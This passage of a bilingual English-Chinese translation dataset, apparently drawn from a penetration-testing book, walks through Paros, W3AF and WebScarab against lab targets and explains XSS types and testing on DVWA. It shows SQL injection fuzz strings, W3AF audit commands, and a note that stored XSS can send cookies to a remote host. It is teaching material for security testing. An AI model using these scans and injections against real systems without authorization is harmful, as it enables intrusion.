  zh: 在响应面板中，我们看到Location:`index.php`。现在，点击顶部的`跟随重定向`按钮。这会产生原始HTML，以及在渲染选项卡下的渲染，显示页面应该是什么样子的：
- en: '![](img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)'
- en: In this example, we used a few of the common tools that come with Burp Suite.
    Burp Suite, as an all-in-one application-security toolkit, is a very extensive
    and powerful web application attack platform.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们使用了Burp Suite提供的一些常用工具。作为一款集成了所有功能的应用安全工具包，Burp Suite是一个非常全面和强大的Web应用程序攻击平台。
- en: Explaining every part of it is outside the scope of this book; therefore, we
    strongly suggest that you visit the website ([http://www.portswigger.net](http://www.portswigger.net))
    for more detailed examples.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 解释每个部分超出了本书的范围；因此，我们强烈建议您访问该网站（[http://www.portswigger.net](http://www.portswigger.net)）以获取更详细的示例。
- en: Paros proxy
  id: totrans-99
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Paros代理
- en: 'Paros proxy is a valuable and intensive vulnerability-assessment tool. It spiders
    through the entire website and executes various vulnerability tests. It also allows
    an auditor to intercept web traffic (HTTP/HTTPS) by setting up a local proxy between
    the browser and the actual target application. This mechanism helps an auditor
    tamper with or manipulate particular requests being made to the target application,
    in order to test it manually. Hence, Paros proxy acts as an active and passive
    web application security assessment tool. To start Paros proxy, navigate to Applications
    | Web Application Analysis | paros or in a Terminal, enter the following command:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: Paros代理是一个有价值且强大的漏洞评估工具。它可以爬行整个网站并执行各种漏洞测试。它还允许审计员通过在浏览器和实际目标应用程序之间设置本地代理来拦截Web流量（HTTP/HTTPS）。这种机制帮助审计员干扰或操纵发送到目标应用程序的特定请求，以便手动测试。因此，Paros代理充当主动和被动的Web应用程序安全评估工具。要启动Paros代理，请导航到应用程序
    | Web应用程序分析 | paros或在终端中输入以下命令：
- en: '[PRE3]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: This will bring up the Paros proxy window. Before you go through any practical
    exercises, you need to set up a local proxy (`127.0.0.1, 8080`) in your favorite
    browser. If you need to change any default settings, navigate to Tools | Options
    in the menu bar. This will allow you to modify the connection settings, local
    proxy values, HTTP authentication, and other relevant information. Once your browser
    has been set up, visit your target website.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 这将打开Paros代理窗口。在进行任何实际练习之前，您需要在您喜欢的浏览器中设置本地代理（`127.0.0.1, 8080`）。如果您需要更改任何默认设置，请导航到菜单栏中的工具
    | 选项。这将允许您修改连接设置、本地代理值、HTTP身份验证和其他相关信息。设置好您的浏览器后，访问您的目标网站。
- en: 'The following are the steps for vulnerability testing and obtaining its report:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是漏洞测试和获取其报告的步骤：
- en: In our case, we browse through `http://192.168.0.30/mutillidae` and notice that
    it has appeared under the Sites tab of the Paros Proxy.
  id: totrans-104
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在我们的案例中，我们浏览`http://192.168.0.30/mutillidae`并注意到它出现在Paros代理的站点选项卡下。
- en: Right-click on `http://192.168.0.30/mutillidae` and choose Spider to crawl through
    the entire website. This will take a few minutes, depending on how big your website
    is.
  id: totrans-105
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 右键单击`http://192.168.0.30/mutillidae`并选择Spider以爬行整个网站。这将需要几分钟，具体取决于您的网站大小。
- en: Once the website crawling has finished, you can see all of the discovered pages
    in the Spider tab at the bottom. Additionally, you can chase up the particular
    request and response for a desired page by selecting the target website, and choosing
    a specific page on the left-hand panel of the Sites tab.
  id: totrans-106
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 网站爬行完成后，您可以在底部的Spider选项卡中看到所有发现的页面。此外，您可以通过在站点选项卡的左侧面板上选择目标网站，并选择特定页面来追踪所需页面的特定请求和响应。
- en: In order to trap any further requests and responses, go to the Trap tab on the
    right-hand panel. This is particularly useful when you decide to throw some manual
    tests against the target application. Moreover, you can construct your own HTTP
    request by navigating to Tools | Manual Request Editor.
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了捕获任何进一步的请求和响应，请转到右侧面板上的Trap选项卡。当您决定对目标应用程序进行一些手动测试时，这是特别有用的。此外，您可以通过导航到工具
    | 手动请求编辑器来构建自己的HTTP请求。
- en: To execute the automated vulnerability testing, we select the target website
    under the Sites tab and navigate to Analyze | Scan All from the menu. Note that
    you can still select the specific types of security tests by navigating to Analyze
    | Scan Policy and then navigating to Analyze | Scan instead of Scan All.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要执行自动化的漏洞测试，我们在站点选项卡下选择目标网站，并导航到分析 | 从菜单中的所有扫描。请注意，您仍然可以通过导航到分析 | 扫描策略，然后导航到分析
    | 扫描而不是扫描所有来选择特定类型的安全测试。
- en: Once the vulnerability testing is complete, you can see a number of security
    alerts on the Alerts tab at the bottom. These are categorized as High, Low, and
    Medium risk levels.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 漏洞测试完成后，您可以在底部的警报选项卡上看到一些安全警报。这些被分类为高、低和中风险级别。
- en: 'If you would like the scan report, navigate to Report | Last Scan Report in
    the menu bar. This will generate a report that lists all of the vulnerabilities
    found during the test session (`/root/paros/session/LatestScannedReport.html`):'
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果您想要扫描报告，请在菜单栏中导航到报告 | 最新扫描报告。这将生成一个报告，列出测试会话期间发现的所有漏洞(`/root/paros/session/LatestScannedReport.html`)。
- en: '![](img/edc4ac8f-5744-4a3c-8e2d-9de0529c6379.png)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![](img/edc4ac8f-5744-4a3c-8e2d-9de0529c6379.png)'
- en: We made use of the basic vulnerability-assessment test for our exemple scenario.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用了基本的漏洞评估测试来进行示例场景。
- en: To become more familiar with various options offered by the Paros proxy, we
    recommend you read the user guide available at: [http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf](http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf).
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 为了更熟悉Paros代理提供的各种选项，我们建议您阅读用户指南，网址为：[http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf](http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf)。
- en: W3AF
  id: totrans-114
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: W3AF
- en: 'W3AF is a feature-rich web application attack-and-audit framework that aims
    to detect and exploit web vulnerabilities. The whole application-security assessment
    process is automated, and the framework is designed to follow three major steps:
    discover, audit, and attack. Each of these steps includes several plugins that
    might help the auditor focus on specific testing criteria. All of these plugins
    can communicate and share test data in order to achieve the required goal. It
    supports the detection and exploitation of multiple web application vulnerabilities,
    including SQL injection, cross-site scripting, remote and local file inclusion,
    buffer overflows, XPath injections, OS commanding, and application misconfiguration.'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: W3AF是一个功能丰富的Web应用程序攻击和审计框架，旨在检测和利用Web漏洞。整个应用程序安全评估过程是自动化的，该框架旨在遵循三个主要步骤：发现、审计和攻击。每个步骤都包括几个插件，可以帮助审计员专注于特定的测试标准。所有这些插件都可以通信并共享测试数据，以实现所需的目标。它支持检测和利用多个Web应用程序漏洞，包括SQL注入、跨站脚本、远程和本地文件包含、缓冲区溢出、XPath注入、操作系统命令和应用程序配置错误。
- en: To get more information about each available plugin, go to [http://w3af.sourceforge.net/plugin-descriptions.php](http://w3af.sourceforge.net/plugin-descriptions.php).
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取有关每个可用插件的更多信息，请转到[http://w3af.sourceforge.net/plugin-descriptions.php](http://w3af.sourceforge.net/plugin-descriptions.php)。
- en: 'To start W3AF, navigate to Applications | Web Vulnerability Analysis | w3af,
    or, in a Terminal, type the following:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动W3AF，请转到应用程序 | Web漏洞分析 | w3af，或者在终端中输入以下内容：
- en: '[PRE4]'
  id: totrans-118
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'This will drop you into a personalized W3AF console mode (`w3af>>>`). Note
    that the GUI version of this tool is also available in the location of the same
    menu, but we have chosen to introduce the console version to you because of its
    flexibility and customization:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 这将使您进入个性化的W3AF控制台模式（`w3af>>>`）。请注意，该工具的GUI版本也可在相同菜单的位置找到，但我们选择向您介绍控制台版本，因为它具有灵活性和可定制性：
- en: '[PRE5]'
  id: totrans-120
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'This will display all of the basic options that can be used to configure the
    test. You can use the help command whenever you require any assistance following
    a specific option. In our exercise, we will configure the output plugin, enable
    the selected audit tests, set up the target, and execute the scan process against
    the target website, using the following commands:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 这将显示可用于配置测试的所有基本选项。每当您需要任何特定选项的帮助时，都可以使用帮助命令。在我们的练习中，我们将配置输出插件，启用所选的审计测试，设置目标，并对目标网站执行扫描过程，使用以下命令：
- en: '`w3af>>> plugins`'
  id: totrans-122
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>> 插件`'
- en: '`w3af/plugins>>> help`'
  id: totrans-123
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 帮助`'
- en: '`w3af/plugins>>> output`'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出`'
- en: '`w3af/plugins>>> output console, html_file`'
  id: totrans-125
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出控制台，html文件`'
- en: '`w3af/plugins>>> output confightml_file`'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出配置html文件`'
- en: '`w3af/plugins/output/config:html_file>>> help`'
  id: totrans-127
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 帮助`'
- en: '`w3af/plugins/output/config:html_file>>> view`'
  id: totrans-128
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 查看`'
- en: '`w3af/plugins/output/config:html_file>>> set verbose True`'
  id: totrans-129
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 设置详细 True`'
- en: '`w3af/plugins/output/config:html_file>>> set output_file metasploitable.html`'
  id: totrans-130
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 设置输出文件 metasploitable.html`'
- en: '`w3af/plugins/output/config:html_file>>> back`'
  id: totrans-131
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:html_file>>> 返回`'
- en: '`w3af/plugins>>> output config console`'
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 输出配置控制台`'
- en: '`w3af/plugins/output/config:console>>> help`'
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 帮助`'
- en: '`w3af/plugins/output/config:console>>> view`'
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 查看`'
- en: '`w3af/plugins/output/config:console>>> set verbose False`'
  id: totrans-135
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 设置详细 False`'
- en: '`w3af/plugins/output/config:console>>> back`'
  id: totrans-136
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins/output/config:console>>> 返回`'
- en: '`w3af/plugins>>> audit`'
  id: totrans-137
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 审计`'
- en: '`w3af/plugins>>> audit htaccess_methods, os_commanding, sqli, xss`'
  id: totrans-138
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 审计 htaccess_methods, os_commanding, sqli, xss`'
- en: '`w3af/plugins>>> back`'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/plugins>>> 返回`'
- en: '`w3af>>> target`'
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>> 目标`'
- en: '`w3af/config:target>>> help`'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 帮助`'
- en: '`w3af/config:target>>> view`'
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 查看`'
- en: '`w3af/config:target>>> set target http://http://192.168.0.30/mutillidae/index.php?page=login.php`'
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 设置目标 http://http://192.168.0.30/mutillidae/index.php?page=login.php`'
- en: '`w3af/config:target>>> back`'
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af/config:target>>> 返回`'
- en: '`w3af>>>`'
  id: totrans-145
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`w3af>>>`'
- en: 'At this point, we have configured all of the required test parameters. Our
    target will be evaluated against the SQL injection, cross-site scripting, OS-commanding,
    and htaccess misconfiguration using the following command:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，我们已经配置了所有必需的测试参数。我们将使用以下命令对目标进行SQL注入、跨站脚本、OS命令执行和htaccess配置错误进行评估：
- en: '[PRE6]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '![](img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)'
  id: totrans-148
  prefs: []
  type: TYPE_IMG
  zh: '![](img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)'
- en: As you can see, we have discovered a cross-site scripting vulnerability in the
    target web application. A detailed report is also created in HTML and sent to
    the `root` folder. This report details all of the vulnerabilities, including the
    debug information about each request and response data transferred between W3AF
    and the target web application.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您所看到的，我们已经发现了目标Web应用程序中的跨站脚本漏洞。还创建了一个详细的HTML报告，并发送到`root`文件夹。该报告详细说明了所有的漏洞，包括关于每个请求和W3AF与目标Web应用程序之间传输的响应数据的调试信息。
- en: The test case that we presented in the preceding code does not reflect the use
    of other useful plugins, profiles, and exploit options. Hence, we strongly recommend
    that you drill through various exercises present in the user guide. These are
    available at [http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf).
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在前面的代码中呈现的测试案例并未反映出其他有用插件、配置文件和利用选项的使用。因此，我们强烈建议您浏览用户指南中提供的各种练习。这些可以在[http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf)找到。
- en: WebScarab
  id: totrans-151
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: WebScarab
- en: WebScarab is a powerful web application security-assessment tool. It has several
    modes of operation, but is mainly operated through the intercept proxy. This proxy
    sits between the end user's browser and the target web application, to monitor
    and modify the requests and responses that are being transmitted on either side.
    This process helps the auditor manually craft the malicious request and observe
    the response thrown back by the web application. It has a number of integrated
    tools, such as fuzzer, session ID analysis, spider, web services analyzer, XSS
    and CRLF vulnerability scanner, and transcoder.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: WebScarab是一个强大的Web应用程序安全评估工具。它有几种操作模式，但主要通过拦截代理进行操作。该代理位于最终用户的浏览器和目标Web应用程序之间，以监视和修改在两侧传输的请求和响应。这个过程帮助审计人员手动制作恶意请求并观察Web应用程序返回的响应。它具有许多集成工具，如模糊器、会话ID分析、蜘蛛、Web服务分析器、XSS和CRLF漏洞扫描器以及转码器。
- en: 'To start WebScarab lite, navigate to Applications | Web Application Analysis
    | webscarab or, in a Terminal, type the following:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动WebScarab lite，请转到应用程序 | Web应用程序分析 | webscarab，或者在终端中输入以下内容：
- en: '[PRE7]'
  id: totrans-154
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'This will pop up the lite edition of WebScarab. For our exercise, we are going
    to transform it into a full-featured edition by navigating to Tools | Use full-featured
    interface in the menu bar. This will confirm the selection and you should restart
    the application accordingly. Once you restart the WebScarab application, you will
    see a number of tool tabs on your screen. Before we start our exercise, we need
    to configure the browser to the local proxy (`127.0.0.1, 8008`) in order to browse
    the target application via the WebScarab intercept proxy. If you want to change
    the local proxy (IP address or port), navigate to the Proxy | Listeners tab. The
    following steps will help you analyze the target application''s session ID:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 这将弹出WebScarab的精简版。对于我们的练习，我们将通过导航到菜单栏中的Tools | Use full-featured interface来将其转换为完整功能版。这将确认选择，并且你应该相应地重新启动应用程序。一旦你重新启动WebScarab应用程序，你将在屏幕上看到一些工具选项卡。在开始练习之前，我们需要将浏览器配置到本地代理（`127.0.0.1,
    8008`），以便通过WebScarab拦截代理浏览目标应用程序。如果你想更改本地代理（IP地址或端口），请导航到Proxy | Listeners选项卡。以下步骤将帮助你分析目标应用程序的会话ID：
- en: Once the local proxy has been set up, you should browse to the target website
    (for example, `http://192.168.0.30/mutillidae`) and visit as many links as possible.
    This will increase the probability of catching any known and unknown vulnerabilities.
    Alternatively, you can select the target under the Summary tab, right-click, and
    choose Spider tree. This will fetch all of the available links in the target application.
  id: totrans-156
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一旦本地代理设置好，你应该浏览到目标网站（例如，`http://192.168.0.30/mutillidae`），并访问尽可能多的链接。这将增加捕获任何已知和未知漏洞的概率。或者，你可以在摘要选项卡下选择目标，右键单击，然后选择Spider
    tree。这将获取目标应用程序中的所有可用链接。
- en: If you want to check the request and response data for the particular page mentioned
    at the bottom of the Summary tab, double-click on it and you can see the parsed
    request in a tabular and raw format. However, the response can also be viewed
    in HTML, XML, text, and hex formats.
  id: totrans-157
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 如果你想检查摘要选项卡底部提到的特定页面的请求和响应数据，双击它，你可以看到表格和原始格式中的解析请求。然而，响应也可以以HTML、XML、文本和十六进制格式查看。
- en: 'During the test period, we may decide to fuzz one of our target application
    links that have the parameters (for example, `artist=1`) with the `GET` method.
    This may reveal any unidentified vulnerability, if it exists. Right-click on the
    selected link and choose the Use as fuzz template. Now, click on the Fuzzer tab
    and manually apply different values to the parameter by clicking on the Add button
    near the Parameters section. In our case, we wrote a small text file listing the
    known SQL injection data (for example, `1 AND 1=2`, `1 AND 1=1`, and single quote
    `('')`), and provided it as a source for the fuzzing parameter value. This can
    be accomplished using the Sources button under the Fuzzer tab. Once your fuzz
    data is ready, click on Start. After all tests are complete, you can double-click
    on an individual request and inspect its response. In one of our test cases, we
    discovered a MySQL injection vulnerability:'
  id: totrans-158
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在测试期间，我们可能决定对我们的目标应用程序链接之一进行模糊处理，该链接具有参数（例如，`artist=1`），使用`GET`方法。如果存在未知的漏洞，这可能会揭示出来。右键单击所选链接，选择“Use
    as fuzz template”。现在，单击Fuzzer选项卡，并通过单击Parameters部分附近的Add按钮手动应用不同的值到参数。在我们的情况下，我们编写了一个列出已知SQL注入数据的小文本文件（例如，`1
    AND 1=2`，`1 AND 1=1`，和单引号`(')`），并将其作为模糊参数值的来源。这可以通过Fuzzer选项卡下的Sources按钮来完成。一旦你的模糊数据准备好了，点击开始。在所有测试完成后，你可以双击单个请求并检查其响应。在我们的一个测试案例中，我们发现了一个MySQL注入漏洞：
- en: '**Error**: You have an error in your SQL syntax; check the manual that corresponds
    to your MySQL server version for the right syntax to use near `''\''` at line
    `1`'
  id: totrans-159
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**错误**：你的SQL语法有错误；请检查与你的MySQL服务器版本相对应的手册，以了解在第`1`行附近使用的正确语法。'
- en: '**Warning**: `mysql_fetch_array()`: supplied argument is not a valid MySQL
    result resource in `/var/www/vhosts/default/htdocs/ listproducts.php` on line
    `74`'
  id: totrans-160
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**警告**：`mysql_fetch_array()`: supplied argument is not a valid MySQL result
    resource in `/var/www/vhosts/default/htdocs/ listproducts.php` on line `74`'
- en: In our last test case, we decided to analyze the target application's session
    ID. For this purpose, go to the `SessionID` Analysis tab and choose Previous Requests
    from the combo box. Once the chosen request has been loaded, go to the bottom,
    select samples (for example, `20`), and click on Fetch to retrieve various samples
    of session IDs. After that, click on the Test button to start the analysis process.
    You can see the results on the Analysis tab and the graphical representation on
    the Visualization tab. This process determines the randomness and unpredictability
    of session IDs, which could result in hijacking other users' sessions or credentials.
  id: totrans-161
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在我们的最后一个测试案例中，我们决定分析目标应用程序的会话ID。为此，请转到“SessionID”分析选项卡，并从组合框中选择“Previous Requests”。一旦选择的请求加载完成，转到底部，选择样本（例如，`20`），然后单击Fetch以检索各种会话ID的样本。之后，单击“测试”按钮开始分析过程。你可以在分析选项卡上看到结果，并在可视化选项卡上看到图形表示。这个过程确定了会话ID的随机性和不可预测性，这可能导致劫持其他用户的会话或凭据。
- en: This tool has a variety of options and features, which could potentially add
    cognitive value to penetration testing. To get more information about the WebScarab
    project, visit [http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project).
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 这个工具有各种选项和功能，可能会为渗透测试增加认知价值。要获取有关WebScarab项目的更多信息，请访问[http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)。
- en: Cross-Site Scripting
  id: totrans-163
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 跨站脚本
- en: '**Cross-Site Scripting** (**XSS**) attacks are still very common today. It
    is a type of injection attack where an attacker injects malicious scripts or code
    into requests sent by the web application. These attacks succeed due to user input
    not being validated correctly before it''s sent to the server.'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: '**跨站脚本**（**XSS**）攻击今天仍然非常普遍。这是一种注入攻击类型，攻击者向Web应用程序发送的请求中注入恶意脚本或代码。这些攻击成功是因为用户输入在发送到服务器之前没有得到正确的验证。'
- en: 'There were initially two types of XSS, but, in 2005, a third was discovered:'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 最初有两种XSS，但在2005年，发现了第三种：
- en: '**Stored XSS: **Storage XSS occurs when the user input is stored on the target
    server and is not validated. The storage can be a database, forum, or comment
    field. The victim unknowingly retrieves the stored data from the web app, which
    the browser thinks is safe to render because of the inherent trust between the
    client and server. Because the input is actually stored, Stored XSS is considered
    to be persistent or permanent.'
  id: totrans-166
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**存储XSS：**存储XSS发生在用户输入被存储在目标服务器上并且没有被验证的情况下。存储可以是数据库、论坛或评论字段。受害者在不知情的情况下从Web应用程序中检索存储的数据，因为浏览器认为由于客户端和服务器之间的固有信任，这些数据是安全的。由于输入实际上被存储，存储XSS被认为是持久性或永久性的。'
- en: '**Reflected XSS:** Reflected XSS occurs when user input is immediately returned
    by a web app in the form of an error message, search result, or any other response
    that includes some or all of the input provided by the user as part of the request,
    without that data being made safe to render in the browser, and without permanently
    storing the user provided data.'
  id: totrans-167
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**反射XSS：**反射XSS发生在用户输入立即由Web应用程序返回，以错误消息、搜索结果或任何其他响应的形式返回，其中包括用户提供的请求的一部分或全部输入，而这些数据在浏览器中没有被安全地呈现，并且没有永久存储用户提供的数据。'
- en: '**DOM XSS:** The **Document Object Model** (**DOM**) is a programming API for
    HTML and XML documents. It defines the logical structure of documents and the
    way a document is accessed and manipulated. DOM-based XSS is a form of XSS where
    the entire tainted data flow from source to sink takes place in the browser, that
    is, the source of the data is in the DOM, the sink is also in the DOM, and the
    data flow never leaves the browser.'
  id: totrans-168
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: DOM XSS：**文档对象模型**（**DOM**）是HTML和XML文档的编程API。它定义了文档的逻辑结构以及文档的访问和操作方式。DOM型XSS是一种XSS形式，其中从源到汇的整个污染数据流都在浏览器中进行，也就是说，数据的源在DOM中，汇也在DOM中，数据流永远不会离开浏览器。
- en: Testing for XSS
  id: totrans-169
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 测试XSS
- en: 'To test for XSS vulnerabilities, we''ll be using JavaScript and standard HTML:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试XSS漏洞，我们将使用JavaScript和标准HTML：
- en: '**Testing for Reflected XSS**'
  id: totrans-171
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**测试反射XSS**'
- en: 'Remember what we stated before: Reflected XSS is named so because user input
    is immediately processed and returned by the web app. To test for it, we need
    to find a field that accepts user input.'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 记住我们之前说过的：反射XSS之所以被命名，是因为用户输入立即被Web应用程序处理并返回。要测试它，我们需要找到一个接受用户输入的字段。
- en: 'Let''s log in to the DVWA page that we cracked the password for previously.
    At the main page, there will be a menu on the left:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们登录到之前破解密码的DVWA页面。在主页上，左侧将有一个菜单：
- en: '![](img/ad32e445-d743-411b-a2b3-96b8e3dec20f.jpg)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ad32e445-d743-411b-a2b3-96b8e3dec20f.jpg)'
- en: 'Select DVWA Security and, in the drop-down box, select low then click Submit.
    By doing this, we''ve set up the web app to operate as though the input is not
    being validated:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 选择DVWA安全，然后在下拉框中选择低，然后单击提交。通过这样做，我们已经设置了Web应用程序，使其操作就好像输入没有被验证一样：
- en: '![](img/88e197b2-2f66-48e2-b358-e395caf986e4.jpg)'
  id: totrans-176
  prefs: []
  type: TYPE_IMG
  zh: '![](img/88e197b2-2f66-48e2-b358-e395caf986e4.jpg)'
- en: 'For our first test, navigate on the page that XSS reflected in the left menu.
    In the input field, type the following JavaScript:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 对于我们的第一个测试，导航到页面上反射XSS显示在左侧菜单中。在输入字段中，输入以下JavaScript：
- en: '[PRE8]'
  id: totrans-178
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '![](img/a46d1be3-8682-4f93-8c01-43272eaef9ec.jpg)'
  id: totrans-179
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a46d1be3-8682-4f93-8c01-43272eaef9ec.jpg)'
- en: Click Submit.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 单击提交。
- en: 'If successful, you should a pop-up message box with the Allows XSS message:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功，您应该看到一个带有“允许XSS”消息的弹出消息框：
- en: '![](img/aa2300bf-9929-42bf-98fb-7538ad7fe838.jpg)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
  zh: '![](img/aa2300bf-9929-42bf-98fb-7538ad7fe838.jpg)'
- en: 'Let''s try another. Type the following:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们再试一次。输入以下内容：
- en: '[PRE9]'
  id: totrans-184
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: '![](img/c27042ef-9252-49be-a00a-65ed7b3c4e94.jpg)'
  id: totrans-185
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c27042ef-9252-49be-a00a-65ed7b3c4e94.jpg)'
- en: This redirects the browser to a different website, in our case, [google.com](https://www.google.com/?gws_rd=ssl).
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 这将把浏览器重定向到不同的网站，在我们的例子中是[google.com](https://www.google.com/?gws_rd=ssl)。
- en: '**Testing for Stored XSS**'
  id: totrans-187
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**测试存储XSS**'
- en: Stored XSS is named so because it stores itself in a location, albeit a database,
    and anytime a user visits the affected site, the code executes. An attacker can
    easily send key information, such as a cookie, to a remote location. To test for
    it, we need to find a field that accepts user input, for example, a comment field.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 存储XSS之所以被命名，是因为它将自身存储在一个位置，尽管是数据库，并且每当用户访问受影响的站点时，代码都会执行。攻击者可以轻松地将关键信息，如cookie，发送到远程位置。要测试它，我们需要找到一个接受用户输入的字段，例如评论字段。
